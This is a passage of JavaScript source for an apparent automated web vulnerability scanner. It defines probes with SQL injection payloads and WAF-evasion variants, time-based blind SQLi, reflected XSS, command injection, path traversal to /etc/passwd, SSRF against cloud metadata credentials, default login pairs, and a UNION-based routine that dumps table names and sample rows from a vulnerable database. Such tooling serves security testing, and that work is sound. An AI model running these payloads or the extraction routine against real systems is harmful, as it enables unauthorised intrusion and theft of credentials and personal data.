  /cyberhunter"><img src=x onerror=alert\(1\)>/i,
  /cyberhunter'><svg\/onload=alert\(1\)>/i,
  /cyberhunter'><script>alert\(1\)<\/script>/i,
];

const DEFAULT_CRED_PAIRS = [
  ["admin", "password"], ["admin", "admin"], ["administrator", "password"],
  ["admin", "123456"], ["root", "root"], ["test", "test"],
  ["user", "password"], ["admin", "password123"], ["demo", "demo"], ["guest", "guest"],
];

const PROBES = [
  {
    name: "SQL Injection (error-based)", owasp: "A03:2021 Injection", severity: "critical", category: "sqli",
    payload: `'`,
    payloads: [
      `'`, `"`, `')`,
      `' OR '1'='1'-- -`, `1' AND '1'='1`,
      // WAF-evasion variants: comment splitting, case mixing, alternate quoting
      `'/**/OR/**/'1'='1`,
      `' oR '1'='1'-- -`,
      `" OR "1"="1`,
      `admin'-- -`,
      // multibyte/metacharacter set — breaks string literals in GBK/Big5 and
      // other multibyte charsets where the trailing byte eats the escape
      `鎈"\\(`,
      `")鎈"\\(`,
    ],
    test: (body) => {
      const hit = SQL_ERRORS.find((re) => re.test(body));
      return hit ? `SQL error leaked: ${body.match(hit)?.[0]}` : null;
    },
    exploit: "Attacker appends ' or '1'='1 / UNION SELECT payloads to extract database contents (user tables, password hashes) or bypass login forms.",
    remediation: "Use parameterized queries / prepared statements; never concatenate input into SQL.",
  },
  {
    name: "SQL Injection (multibyte/metachar probe)", owasp: "A03:2021 Injection", severity: "critical", category: "sqli",
    payload: `鎈"\\(`,
    payloads: [`鎈"\\(`, `1鎈"\\(`],
    test: (body, r) => {
      const hit = SQL_ERRORS.find((re) => re.test(body));
      if (hit) return `SQL error leaked: ${body.match(hit)?.[0]}`;
      // also flag abnormal 500 responses — often means the payload broke the query
      if (r.status >= 500) return `Server error ${r.status} triggered by metacharacter payload`;
      return null;
    },
    exploit: "The 鎈 ' \" \\ ( multibyte/metacharacter set breaks out of string literals and numeric contexts and can bypass naive filters; combined with UNION/boolean/time-based payloads it enables full database extraction or authentication bypass.",
    remediation: "Use parameterized queries / prepared statements; validate and cast input types; never concatenate input into SQL.",
  },
  {
    name: "XSS (reflected)", owasp: "A03:2021 Injection", severity: "high", category: "xss",
    payload: `cyberhunter<svg/onload=alert(1)>"'`,
    payloads: [
      `cyberhunter<svg/onload=alert(1)>"'`,
      `cyberhunter<img src=x onerror=alert(1)>"'`,
      `cyberhunter"><img src=x onerror=alert(1)>"'`,
      `cyberhunter'><svg/onload=alert(1)>"'`,
      // WAF-evasion variants: case mixing defeats naive keyword filters
      `cyberhunter<SvG/OnLoAd=alert(1)>"'`,
      `cyberhunter'><ScRiPt>alert(1)</ScRiPt>"'`,
      `cyberhunter"><ImG SrC=x OnErRoR=alert(1)>"'`,
    ],
    test: (body) => {
      const hit = XSS_RES.find((re) => re.test(body));
      return hit ? `Payload reflected unencoded in response body: ${body.match(hit)?.[0]}` : null;
    },
    exploit: "Attacker crafts a link like https://target/search?q=<script>steal()</script>; victim clicks → script runs in their session → session cookie/token theft.",
    remediation: "Output-encode all user input; deploy a strict Content-Security-Policy.",
  },
  {
    name: "Blind SQL Injection (time-based)", owasp: "A03:2021 Injection", severity: "critical", category: "sqli",
    payload: `1' AND SLEEP(3)-- -`,
    estReqs: 10, // control + up to 9 DB-specific sleep payloads
    // custom multi-request probe: control vs time-delay payloads across
    // MySQL/MariaDB, PostgreSQL, MSSQL and Oracle — first real delay wins.
    run: async (target, probe, ft, ftF, authCookie) => {
      if (!["query", "form-get", "form-post"].includes(target.kind)) return { reqs: 0 };
      const control = "1";
      const sleepPayloads = [
        { p: `1' AND SLEEP(3)-- -`, db: "MySQL/MariaDB" },
        { p: `1) AND SLEEP(3)-- -`, db: "MySQL/MariaDB" },
        { p: `1 AND SLEEP(3)-- -`, db: "MySQL/MariaDB" },
        { p: `1' AND (SELECT count(*) FROM pg_sleep(3))>0-- -`, db: "PostgreSQL" },
        { p: `1) AND (SELECT count(*) FROM pg_sleep(3))>0-- -`, db: "PostgreSQL" },
        { p: `1'; WAITFOR DELAY '0:0:3'-- -`, db: "MSSQL" },
        { p: `1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('CYBERHUNTER',3)-- -`, db: "Oracle" },
      ];
      let reqs = 0;
      try {
        const cReq = buildProbeRequest(target, control, authCookie);
        reqs++;
        const t1 = performance.now();
        const r1 = await ftF(cReq.url, { method: cReq.method, headers: cReq.headers, body: cReq.body }, 8000);
        await r1.text();
        const dControl = performance.now() - t1;
        // On slow/loaded servers natural latency varies by seconds, so a
        // single >2s delta is not proof. A candidate must delay AGAIN on a
        // confirmation round against a fresh control — kills most FPs.
        const timed = async (value, ms) => {
          const q = buildProbeRequest(target, value, authCookie);
          reqs++;
          const t = performance.now();
          const r = await ftF(q.url, { method: q.method, headers: q.headers, body: q.body }, ms);
          await r.text();
          return { r, d: performance.now() - t };
        };
        for (const { p: sleepPayload, db } of sleepPayloads) {
          const s1 = await timed(sleepPayload, 12000);
          const delta = s1.d - dControl;
          // require a meaningful absolute delay AND a healthy ratio
          if (delta <= 2000 || s1.d < dControl * 1.8) continue;
          // confirmation: fresh control + repeat sleep payload
          const c2 = await timed(control, 8000);
          const s2 = await timed(sleepPayload, 12000);
          const delta2 = s2.d - ((dControl + c2.d) / 2);
          if (delta2 <= 2000 || s2.d < c2.d * 1.8) continue;
          return {
            hit: `Time-based blind SQLi (${db}): confirmed delay ${Math.round(s2.d)}ms vs control ~${Math.round(c2.d)}ms (first ${Math.round(s1.d)}ms vs ${Math.round(dControl)}ms)`,
            res: s2.r, payload: sleepPayload, reqs,
          };
        }
      } catch { /* ignore */ }
      return { reqs };
    },
    exploit: "No error is shown, but the attacker measures response time: SLEEP(3) makes the server wait 3 seconds only when the injected condition is true — enabling boolean/time-based extraction of the entire database.",
    remediation: "Use parameterized queries / prepared statements; never concatenate input into SQL.",
  },
  {
    name: "Command Injection", owasp: "A03:2021 Injection", severity: "critical", category: "cmdi",
    // Marker uses arithmetic expansion ($((7*7)) → 49): a page that merely
    // reflects the (decoded) payload shows the literal "CYBERHUNTER_$((7*7))",
    // never "CYBERHUNTER_49" — only real shell execution produces the marker.
    payload: `127.0.0.1 && echo CYBERHUNTER_$((7*7))`,
    payloads: [
      `127.0.0.1 && echo CYBERHUNTER_$((7*7))`,
      `127.0.0.1; echo CYBERHUNTER_$((7*7))`,
      `127.0.0.1 | echo CYBERHUNTER_$((7*7))`,
      `127.0.0.1$(echo CYBERHUNTER_$((7*7)))`,
      `127.0.0.1` + "`" + `echo CYBERHUNTER_$((7*7))` + "`",
    ],
    appliesTo: (param) => /ip|host|hostname|cmd|command|exec|ping|query|search|filename|filepath|path|dir|include|page|template|doc|file|target|callback|load|show/i.test(param),
    test: (body, r, payload) => {
      // marker must appear WITHOUT the raw payload being reflected verbatim —
      // otherwise it's just XSS-style reflection / PHP warning echo, not shell execution.
      // Decode entities first: PHP warnings escape & as &amp;.
      const decoded = body.replace(/&amp;/g, "&").replace(/&lt;/g, "<").replace(/&gt;/g, ">");
      if (!decoded.includes("CYBERHUNTER_49")) return null;
      if (payload && decoded.includes(payload)) return null;
      return "Shell command output marker present and raw payload not reflected — input reaches a command interpreter.";
    },
    exploit: "Attacker chains shell metacharacters (; | && || ` $()) to run arbitrary OS commands: read /etc/passwd, download backdoors, pivot to internal networks.",
    remediation: "Never pass user input to shell commands; use safe APIs; if unavoidable, strictly allowlist and escape input.",
  },
  {
    name: "Local File Inclusion (LFI)", owasp: "A03:2021 Injection", severity: "high", category: "lfi",
    payload: `../../../../../../etc/passwd`,
    // custom multi-payload probe: tries passwd / win.ini / filter-bypass variants
    run: async (target, probe, ft, ftF, authCookie) => {
      if (!["query", "form-get", "form-post"].includes(target.kind)) return { reqs: 0 };
      if (!/page|file|include|path|dir|doc|template|load|show|view|document|site|html|pg|folder/i.test(target.param)) return { reqs: 0 };
      const payloads = [
        `../../../../../../etc/passwd`,
        `../../../../../../windows/win.ini`,
        `....//....//....//etc/passwd`,
        `..%2f..%2f..%2f..%2fetc%2fpasswd`,
        `..\\..\\..\\..\\windows\\win.ini`,
      ];
      const markers = [/root:.*:0:0:/, /\[fonts\]/i, /\[extensions\]/i, /daemon:.*:\/usr\/sbin\/nologin/];
      let reqs = 0;
      for (const p of payloads) {
        reqs++;
        try {
          const sub = { ...probe, payload: p };
          const { res, body } = await runProbe(target, sub, ft, ftF, authCookie);
          const m = markers.find((re) => re.test(body));
          if (m) {
            const ev = body.match(m)?.[0]?.slice(0, 60) ?? "";
            return { hit: `LFI: payload '${p}' → ${ev}`, res, payload: p, reqs };
          }
        } catch { /* try next payload */ }
      }
      return { reqs };
    },
    exploit: "Attacker traverses the filesystem (../../etc/passwd, ..\\windows\\win.ini) to read source code, config files with credentials, or logs; combined with file upload/RCE it leads to full compromise.",
    remediation: "Never include user-supplied paths; map inputs to an allowlist of files; disable allow_url_include.",
  },
  {
    name: "SSRF (cloud metadata)", owasp: "A10:2021 Server-Side Request Forgery", severity: "critical", category: "ssrf",
    payload: `http://169.254.169.254/latest/meta-data/`,
    appliesTo: (param) => /url|uri|callback|webhook|fetch|proxy|feed|api|endpoint|server|remote|download|import|include|reference|source|redirect|image|img|src|host|domain|target|next|return|dest|continue|file|path|page|doc|site|link|out|view|show|load|request/i.test(param),
    test: (body) => {
      const m = body.match(/ami-id|instance-id|local-hostname|public-ipv4|public-keys|iam\/|security-credentials/i);
      return m ? `Cloud metadata content leaked: ${m[0]}` : null;
    },
    exploit: "Attacker makes the server fetch http://169.254.169.254/latest/meta-data/iam/security-credentials/ and harvests temporary AWS/ cloud credentials → full cloud account takeover.",
    remediation: "Validate and allowlist URL inputs; block link-local/metadata IPs (169.254.0.0/16, 127.0.0.0/8, ::1) at the network and application layer.",
  },
  {
    name: "Open Redirect", owasp: "A01:2021 Broken Access Control", severity: "medium", category: "redirect",
    payload: `https://cyberhunter-audit.invalid/`,
    payloads: [`https://cyberhunter-audit.invalid/`, `//cyberhunter-audit.invalid/`, `/\\cyberhunter-audit.invalid/`],
    appliesTo: (param) => REDIRECT_PARAM.test(param),
    test: (body, r) => {
      const loc = r.headers.get("location") ?? "";
      return loc.includes("cyberhunter-audit.invalid") ? `Redirected to attacker domain: ${loc}` : null;
    },
    exploit: "Attacker sends https://target/login?next=https://evil.com — after login the victim is silently redirected to a phishing clone.",
    remediation: "Allowlist redirect targets; never redirect to user-supplied URLs.",
  },
];

// Build the list of injection endpoints to test.
function buildTargets({ pages, params, forms, cookies }) {
  const targets = [];
  const seen = new Set();
  const add = (t) => {
    const key = `${t.kind}|${t.url}|${t.param}|${t.headerName ?? ""}|${t.cookieName ?? ""}`;
    if (!seen.has(key)) { seen.add(key); targets.push(t); }
  };

  // 1) Query-string params on every crawled page URL.
  // Dedupe by (path + sorted param-name set): download/listing sites expose
  // hundreds of URLs that differ ONLY in param values (id=1, id=2, ...). The
  // injectable surface is the same — probing one representative per signature
  // keeps the whole budget for distinct endpoints instead of wasting it.
  const querySigSeen = new Set();
  for (const p of pages) {
    const u = new URL(p.url);
    const names = [...new Set(u.searchParams.keys())].sort();
    if (!names.length) continue;
    const sig = `${u.pathname}|${names.join(",")}`;
    if (querySigSeen.has(sig)) continue;
    querySigSeen.add(sig);
    for (const k of names) {
      add({ kind: "query", url: p.url, param: k, pageUrl: p.url });
    }
  }

  // 2) Form fields — GET forms submit all fields as query, POST as body
  for (const f of forms) {
    for (const param of f.params.slice(0, 8)) {
      add({
        kind: f.method === "post" ? "form-post" : "form-get",
        url: f.url, param, method: f.method, pageUrl: f.url,
        fields: Object.fromEntries((f.fields ?? []).map((x) => [x.name, x.value])),
      });
    }
  }

  // 3) Discovered param names applied to the start page (covers JS-driven params)
  //    — skipped to avoid noise; query/form coverage is enough.

  // 4) Header injection points
  for (const h of INJECTABLE_HEADERS) {
    add({ kind: "header", url: pages[0]?.url, param: h, headerName: h, pageUrl: pages[0]?.url });
  }

  // 5) Cookie value injection points
  for (const c of cookies.slice(0, 5)) {
    add({ kind: "cookie", url: pages[0]?.url, param: c, cookieName: c, pageUrl: pages[0]?.url });
  }

  return targets.filter((t) => t.url);
}

// build the HTTP request (url/method/headers/body) for a target+payload value.
// Used by runProbe and by custom multi-request probes (blind SQLi, LFI, ...).
function buildProbeRequest(target, value, authCookie) {
  const u = new URL(target.url);
  const headers = {};
  let body = null;
  let method = "GET";

  if (target.kind === "query") {
    u.searchParams.set(target.param, value);
  } else if (target.kind === "form-get") {
    for (const [k, v] of Object.entries(target.fields ?? {})) {
      if (k !== target.param) u.searchParams.set(k, String(v));
    }
    u.searchParams.set(target.param, value);
  } else if (target.kind === "form-post") {
    method = "POST";
    headers["Content-Type"] = "application/x-www-form-urlencoded";
    const params = new URLSearchParams();
    for (const [k, v] of Object.entries(target.fields ?? {})) {
      params.set(k, k === target.param ? value : String(v));
    }
    if (!(target.fields && target.param in target.fields)) params.set(target.param, value);
    body = params.toString();
  } else if (target.kind === "header") {
    headers[target.headerName] = value;
  } else if (target.kind === "cookie") {
    headers["Cookie"] = [authCookie, `${target.cookieName}=${value}`].filter(Boolean).join("; ");
  }
  return { url: u.toString(), method, headers, body };
}

async function runProbe(target, probe, ft, ftF, authCookie) {
  const req = buildProbeRequest(target, probe.payload, authCookie);
  // open-redirect probe needs the raw 3xx; everything else follows redirects
  const doFetch = probe.category === "redirect" ? ft : ftF;
  const r = await doFetch(req.url, { method: req.method, headers: req.headers, body: req.body }, 8000);
  const text = await r.text();
  if (process.env.SCAN_DEBUG) {
    console.error(`[dbg] ${target.kind} ${new URL(req.url).pathname}${new URL(req.url).search} → ${r.status} | token=${target.fields?.user_token ?? "-"} | body=${text.length}b`);
  }
  return { res: r, body: text, req };
}

// Reconstruct the raw HTTP request for reports — Cookie VALUES are redacted
// (names kept for context) so session tokens never land in the findings DB.
function rawRequestText(req) {
  try {
    const u = new URL(req.url);
    const lines = [`${req.method} ${u.pathname}${u.search} HTTP/1.1`, `Host: ${u.host}`];
    for (const [k, v] of Object.entries(req.headers ?? {})) {
      if (/^cookie$/i.test(k)) {
        lines.push(`Cookie: ${String(v).split(";").map((p) => {
          const [n] = p.trim().split("=");
          return `${n}=[redacted]`;
        }).join("; ")}`);
      } else {
        lines.push(`${k}: ${v}`);
      }
    }
    if (req.body != null) lines.push(`Content-Length: ${Buffer.byteLength(req.body)}`);
    lines.push("", req.body ?? "");
    return lines.join("\n");
  } catch { return ""; }
}

// Raw response text (status line + headers + truncated body) for reports.
// Set-Cookie values are redacted; body capped to keep db.json reasonable.
async function rawResponseText(res, bodyText, maxBody = 8000) {
  try {
    const lines = [`HTTP/1.1 ${res.status} ${res.statusText ?? ""}`.trimEnd()];
    const seen = new Set();
    res.headers.forEach((v, k) => {
      const lk = k.toLowerCase();
      if (lk === "set-cookie" || seen.has(lk)) return;
      seen.add(lk);
      lines.push(`${k}: ${v}`);
    });
    for (const c of res.headers.getSetCookie?.() ?? []) {
      const [pair] = c.split(";");
      const name = pair.split("=")[0].trim();
      lines.push(`Set-Cookie: ${name}=[redacted]`);
    }
    let body = bodyText ?? "";
    if (body.length > maxBody) body = body.slice(0, maxBody) + `\n\n... [truncated ${body.length - maxBody} chars]`;
    lines.push("", body);
    return lines.join("\n");
  } catch { return ""; }
}

// default probe execution: try each payload variant until one hits.
// Returns { hit, res, payload, reqs, request, response } or null. Consumes `budget.n` per request.
async function runDefaultProbe(target, probe, ft, ftF, authCookie, budget) {
  const payloads = probe.payloads ?? [probe.payload];
  let reqs = 0;
  for (const payload of payloads) {
    if (budget && budget.n <= 0) break;
    if (budget) budget.n--;
    reqs++;
    const sub = { ...probe, payload };
    try {
      const { res, body, req } = await runProbe(target, sub, ft, ftF, authCookie);
      const hit = probe.test(body, res, payload);
      if (hit) {
        return {
          hit, res, payload, reqs,
          request: rawRequestText(req),
          response: await rawResponseText(res, body),
        };
      }
    } catch { /* try next payload */ }
  }
  return reqs ? { reqs } : null;
}

// Baseline status with a benign (non-malicious, invalid) value — used to tell
// "payload broke the app" apart from "app 500s on any bad input" (input validation).
async function baselineStatus(target, ft, ftF, authCookie) {
  try {
    const req = buildProbeRequest(target, "cyberhunter_baseline_zzz", authCookie);
    const r = await ftF(req.url, { method: req.method, headers: req.headers, body: req.body }, 8000);
    await r.text();
    return r.status;
  } catch { return 0; }
}

// ---------- UNION-based SQLi data extraction ----------
// Runs only on parameters where an SQLi probe already hit. Enumerates the
// injectable prefix + column count via a UNION marker, then dumps the DB
// fingerprint (user/database/version), table names, column names, and sample
// rows — payloads that actually return database content, not just errors.
async function sqliUnionExtract(target, ctx) {
  const { ftF, authCookie, budget, refreshFormTokens, log, t0, findings, finding } = ctx;
  const send = async (value) => {
    if (budget.n <= 0) return null;
    if (target.kind === "form-get" || target.kind === "form-post") await refreshFormTokens(target);
    budget.n--;
    const req = buildProbeRequest(target, value, authCookie);
    const r = await ftF(req.url, { method: req.method, headers: req.headers, body: req.body }, 8000);
    return await r.text();
  };

  // 1) find injectable prefix + UNION column count using a marker value.
  // Marker is split inside CONCAT so a reflected raw payload cannot fake a hit.
  // Prefixes cover quoted strings ('), quoted numerics (1'), double quotes, and
  // unquoted numeric contexts (-1 / 0 — e.g. WHERE id=-1 UNION SELECT ...).
  let prefix = null, cols = 0;
  outer:
  for (const p of ["'", '"', "')", "1'", '1"', "-1", "0"]) {
    for (let n = 1; n <= 15; n++) {
      const marker = `CHUNION_N${n}`;
      const val = `${p} UNION SELECT ${Array.from({ length: n }, (_, i) => i === 0 ? `CONCAT('CHUNION','_N${n}')` : `'x'`).join(",")}-- -`;
      const body = await send(val).catch(() => null);
      if (body && body.includes(marker)) { prefix = p; cols = n; break outer; }
    }
  }
  if (!prefix) return null;
  log(`[${t0()}s] [A03] UNION injection confirmed on ${target.param} (${cols} column(s), prefix ${JSON.stringify(prefix)})`);

  // select list padded to `cols` columns; optional FROM/WHERE/LIMIT appended
  const union = (expr, from = "", where = "", limit = "") => {
    const arr = Array.from({ length: cols }, () => "NULL");
    arr[0] = expr;
    return `${prefix} UNION SELECT ${arr.join(",")}${from}${where}${limit}-- -`;
  };
  const grab = (re, body) => [...body.matchAll(re)].map((m) => m[1]).filter(Boolean).slice(0, 12);

  // 2) DB fingerprint: user | database | version
  const infoPayload = union(`CONCAT('CHUNION','_INFO:',user(),'|',database(),'|',version())`);
  const infoBody = await send(infoPayload).catch(() => null);
  const info = infoBody?.match(/CHUNION_INFO:([^<"']+)/)?.[1]?.replace(/\s+/g, " ").trim().slice(0, 200) ?? null;

  // 3) table names in the current schema
  const tblPayload = union(`CONCAT('CHUNION','_TBL:',table_name)`, ` FROM information_schema.tables`, ` WHERE table_schema=database()`, ` LIMIT 15`);
  const tblBody = await send(tblPayload).catch(() => null);
  const tables = tblBody ? grab(/CHUNION_TBL:([^\s<"']+)/g, tblBody) : [];

  // 4) dump rows from the first non-system table: fetch its columns, then SELECT them
  const targetTable = tables.find((t) => !/^(information_schema|mysql|performance_schema|sys)$/i.test(t));
  let rowPayload = null, rows = [];
  if (targetTable) {
    const colPayload = union(`CONCAT('CHUNION','_COL:',column_name)`, ` FROM information_schema.columns`, ` WHERE table_schema=database() AND table_name='${targetTable.replace(/'/g, "")}'`, ` LIMIT 20`);
    const colBody = await send(colPayload).catch(() => null);
    const columns = colBody ? grab(/CHUNION_COL:([^\s<"']+)/g, colBody) : [];
    if (columns.length) {
      const esc = (c) => `\`${c.replace(/`/g, "``")}\``;
      const sel = `CONCAT('CHUNION','_ROW:',CONCAT_WS('|',${columns.slice(0, 12).map(esc).join(",")}))`;
      rowPayload = union(sel, ` FROM \`${targetTable.replace(/`/g, "``")}\``, "", " LIMIT 5");
      const rowBody = await send(rowPayload).catch(() => null);
      rows = rowBody ? grab(/CHUNION_ROW:([^<"']+)/g, rowBody).map((r) => r.trim().slice(0, 200)) : [];
    }
  }

  if (!info && !tables.length && !rows.length) return null;

  const evidenceParts = [];
  if (info) evidenceParts.push(`DB fingerprint → ${info}`);
  if (tables.length) evidenceParts.push(`Tables (${tables.length}) → ${tables.join(", ")}`);
  if (rows.length) evidenceParts.push(`Sample rows from '${targetTable}' → ${rows.join(" ;; ")}`);

  const vectorLabel =
    target.kind === "header" ? `header '${target.headerName}'` :
    target.kind === "cookie" ? `cookie '${target.cookieName}'` :
    target.kind === "form-get" ? `GET form param '${target.param}'` :
    `param '${target.param}'`;

  findings.push(finding({
    title: `SQL Injection — UNION data extraction confirmed (${vectorLabel})`,
    severity: "critical", category: "sqli", owasp: "A03:2021 Injection",
    description: `UNION-based SQL injection confirmed — attacker extracted live database content from ${target.url}.`,
    parameter: target.param,
    vector: target.kind,
    endpoint: target.url,
    payload: infoPayload,
    evidence: evidenceParts.join(" | ").slice(0, 1500),
    exploit: "Attacker uses UNION SELECT to enumerate schema and exfiltrate table contents (credentials, PII, tokens) row by row.",
    recommendation: "Use parameterized queries / prepared statements; apply least-privilege DB accounts; never concatenate input into SQL.",
  }));
  log(`[${t0()}s] [!] UNION extraction succeeded on ${target.param}: ${info ?? tables.join(",")}`);
  return true;
}

// ---------- DOM XSS static analysis ----------
// DOM XSS never reaches the server — the payload lives in the URL fragment /
// query and is consumed by client-side JS, so HTTP probes can't see it. This
// pass scans inline <script> blocks for dangerous source→sink pairs
// (location/hash/URL → document.write/innerHTML/eval/...) and reports the page
// for manual browser verification.
const DOM_SOURCES = /location\.(href|hash|search|pathname)|document\.(URL|referrer|documentURI|baseURI)|window\.name|localStorage|sessionStorage|document\.cookie|postMessage/i;
const DOM_SINKS = /document\.write|\.innerHTML|\.outerHTML|insertAdjacentHTML|\beval\s*\(|new\s+Function|set(?:Timeout|Interval)\s*\(\s*['"`]|location(?:\.href)?\s*=[^=]|window\.open\s*\(/i;

// Candidate input names a DOM script might read — extracted from the script
// itself (indexOf("x="), URLSearchParams.get("x"), location.search parsing)
// plus common fallback names when nothing is identifiable.
const DOM_PARAM_FALLBACK = ["q", "query", "search", "id", "page", "default", "name", "input", "data", "url", "redirect", "file", "lang", "locale", "keyword", "term", "msg", "message", "s", "text", "value"];
function extractDomParams(script) {
  const found = new Set();
  for (const m of script.matchAll(/["']([A-Za-z_][\w-]*)=/g)) found.add(m[1]);
  for (const m of script.matchAll(/\.get\(\s*["']([^"']+)["']\s*\)/g)) found.add(m[1]);
  for (const m of script.matchAll(/indexOf\(\s*["'][^"']*?([A-Za-z_][\w-]*)=/g)) found.add(m[1]);
  found.delete("http"); found.delete("https"); found.delete("www");
  const list = [...found].filter((p) => p.length <= 30).slice(0, 6);
  return list.length ? list : DOM_PARAM_FALLBACK.slice(0, 8);
}

function scanDomXss(pages, findings, finding, log, t0) {
  const scriptRe = /<script(?![^>]*\bsrc=)[^>]*>([\s\S]*?)<\/script>/gi;
  const candidates = [];
  for (const page of pages ?? []) {
    const html = page.html;
    if (!html) continue;
    let m, hits = 0, pageParams = null;
    while ((m = scriptRe.exec(html)) && hits < 3) {
      const src = m[1];
      if (src.length < 20 || src.length > 200000) continue;
      const sources = [...new Set((src.match(new RegExp(DOM_SOURCES.source, "gi")) ?? []).map((s) => s.toLowerCase()))];
      const sinks = [...new Set((src.match(new RegExp(DOM_SINKS.source, "gi")) ?? []).map((s) => s.toLowerCase()))];
      if (!sources.length || !sinks.length) continue;
      hits++;
      pageParams ??= extractDomParams(src);
      const snippet = src.replace(/\s+/g, " ").slice(0, 300);
      findings.push(finding({
        title: `Potential DOM-based XSS (${page.url})`,
        severity: "high", category: "xss", owasp: "A03:2021 Injection",
        description: `Inline script combines DOM source(s) [${sources.slice(0, 4).join(", ")}] with dangerous sink(s) [${sinks.slice(0, 4).join(", ")}] — client-side injection possible. Requires a real browser to confirm execution.`,
        endpoint: page.url,
        parameter: "DOM (URL/fragment)",
        vector: "dom-xss",
        payload: `<script>alert(1)</script> or "'><svg/onload=alert(1)> — append to the parameter read by the script`,
        evidence: `Sources: ${sources.join(", ")} | Sinks: ${sinks.join(", ")} | Script: ${snippet}`,
        exploit: "Attacker crafts a URL whose query/hash value is written into the DOM unsanitized; victim opens link → script executes in their session.",
        recommendation: "Never pass location/hash/URL data to DOM sinks; use textContent instead of innerHTML/document.write; sanitize with DOMPurify.",
      }));
      log(`[${t0()}s] [!] Potential DOM XSS on ${page.url} (sources: ${sources.slice(0, 3).join(", ")})`);
    }
    if (hits && pageParams) candidates.push({ url: page.url, params: pageParams });
  }
  return candidates;
}

// dedupe Set-Cookie headers by name (last wins) → "k=v; k2=v2"
function joinCookiePairs(cookieHeaders) {
  const byName = new Map();
  for (const c of cookieHeaders ?? []) {
    const pair = c.split(";")[0];
    const name = pair.split("=")[0].trim();
    if (name) byName.set(name, pair);
  }
  return [...byName.values()].join("; ");
}

// harvest hidden <input> fields (CSRF tokens etc.) from HTML
function extractHiddenInputs(html) {
  const out = {};
  const re = /<input[^>]*>/gi;
  let m;
  while ((m = re.exec(html))) {
    const tag = m[0];
    const name = /name=["']([^"']+)["']/i.exec(tag)?.[1];
    const val = /value=["']([^"']*)["']/i.exec(tag)?.[1] ?? "";
    const type = (/type=["']([^"']+)["']/i.exec(tag)?.[1] ?? "text").toLowerCase();
    if (name && type === "hidden") out[name] = val;
  }
  return out;
}

// ---------- API / JSON body surface ----------

const SENSITIVE_KEY = /pass(word|wd|phrase)?|secret|api[_-]?key|private|credential|hash/i;

function collectJsonKeys(obj, out = new Set(), depth = 0) {
  if (depth > 3 || obj == null || typeof obj !== "object") return out;
  if (Array.isArray(obj)) {
    for (const x of obj.slice(0, 3)) collectJsonKeys(x, out, depth + 1);
    return out;
  }
  for (const [k, v] of Object.entries(obj)) {
    out.add(k);
    collectJsonKeys(v, out, depth + 1);
  }
  return out;
}

function jsonStrings(obj, out = [], depth = 0) {
  if (depth > 4 || obj == null) return out;
  if (typeof obj === "string") { out.push(obj); return out; }
  if (Array.isArray(obj)) { for (const x of obj.slice(0, 5)) jsonStrings(x, out, depth + 1); return out; }
  if (typeof obj === "object") { for (const v of Object.values(obj).slice(0, 10)) jsonStrings(v, out, depth + 1); }
  return out;
}

async function scanApiSurface({ pages, origin, basePath, ftF, authCookie, log, t0, findings, finding }) {
  const endpoints = extractApiEndpoints(pages, origin);
  // discover OpenAPI specs near API pages
  const specDirs = new Set();
  for (const p of pages) {
    try { if (/\/api\//i.test(new URL(p.url).pathname)) specDirs.add(new URL(".", p.url).pathname); } catch { /* ignore */ }
  }
  for (const dir of [...specDirs].slice(0, 4)) {
    for (const name of ["openapi.yml", "openapi.json", "swagger.json"]) {
      try {
        const specUrl = new URL(dir + name, origin).toString();
        const r = await ftF(specUrl, {}, 6000);
        if (!r.ok) continue;
        parseOpenApiSpec(await r.text(), specUrl, origin, endpoints);
      } catch { /* ignore */ }
    }
  }
  // dedupe + merge methods
  const epMap = new Map();
  for (const ep of endpoints) {
    if (!epMap.has(ep.url)) epMap.set(ep.url, new Set());
    for (const m of ep.methods ?? []) epMap.get(ep.url).add(m);
  }
  const eps = [...epMap.entries()].slice(0, 20).map(([url, methods]) => ({ url, methods: [...methods] }));
  if (!eps.length) {
    log(`[${t0()}s] [A03] API surface: no API endpoints discovered in crawled pages/JS`);
    return;
  }
  log(`[${t0()}s] [A03] API & JSON body surface: ${eps.length} endpoint(s) discovered`);

  let apiReqs = 0;
  const API_CAP = 70;
  const JSON_PAYLOADS = [`'`, `鎈"\\(`, `cyberhunter<svg/onload=alert(1)>"'`];

  for (const ep of eps) {
    if (apiReqs >= API_CAP) { log(`[${t0()}s] [A03] API probe cap reached (${API_CAP} requests)`); break; }
    // Apps installed under a subpath (e.g. /DVWA/) reference API paths
    // root-relative in JS/ OpenAPI — retry 404s with the base path prefix.
    let epUrl = ep.url;
    let epPath = "";
    try { epPath = new URL(ep.url).pathname; } catch { /* ignore */ }
    if (basePath && basePath !== "/" && epPath && !epPath.startsWith(basePath)) {
      epUrl = origin + basePath + epPath.replace(/^\/+/, "");
    }
    let getJson = null;
    let getStatus = 0;
    const methodsKnown = ep.methods.length > 0;
    const methods = methodsKnown ? ep.methods : ["GET"];

    if (methods.includes("GET")) {
      try {
        let r = await ftF(epUrl, {}, 7000);
        apiReqs++;
        getStatus = r.status;
        if (getStatus === 404 && epUrl !== ep.url) {
          // base-path variant also failed — try the original root-relative URL
          r = await ftF(ep.url, {}, 7000);
          apiReqs++;
          getStatus = r.status;
          if (getStatus !== 404) epUrl = ep.url;
        }
        const ctype = r.headers.get("content-type") ?? "";
        const body = await r.text();
        if (ctype.includes("json") || /^\s*[[{]/.test(body)) {
          try { getJson = JSON.parse(body); } catch { getJson = null; }
        }
        if (getJson) {
          const keys = collectJsonKeys(getJson);
          const sensitive = [...keys].filter((k) => SENSITIVE_KEY.test(k));
          if (sensitive.length) {
            findings.push(finding({
              title: `Sensitive data exposed in API response (${new URL(epUrl).pathname})`, severity: "high", category: "api", owasp: "A01:2021 Broken Access Control",
              description: "API endpoint returns sensitive fields (passwords/hashes/tokens/secrets) without authorization checks.",
              endpoint: epUrl, parameter: sensitive[0], vector: "json-body", payload: "GET (read-only)",
              evidence: `GET ${new URL(epUrl).pathname} → JSON keys include: ${sensitive.slice(0, 6).join(", ")}`,
              exploit: "Attacker retrieves password hashes/secrets directly from the API (e.g. via legacy API versions) and cracks or reuses them.",
              recommendation: "Never serialize secrets in API responses; enforce authorization; audit all API versions.",
            }));
          }
          // version downgrade: /v2/ → /v1/ exposes older, less-hardened serializers
          const vm = /\/v(\d+)\//i.exec(new URL(epUrl).pathname);
          if (vm && Number(vm[1]) > 1 && apiReqs < API_CAP) {
            const downUrl = epUrl.replace(/\/v\d+\//i, `/v${Number(vm[1]) - 1}/`);
            try {
              const r2 = await ftF(downUrl, {}, 7000);
              apiReqs++;
              const b2 = await r2.text();
              if (/^\s*[[{]/.test(b2)) {
                const j2 = JSON.parse(b2);
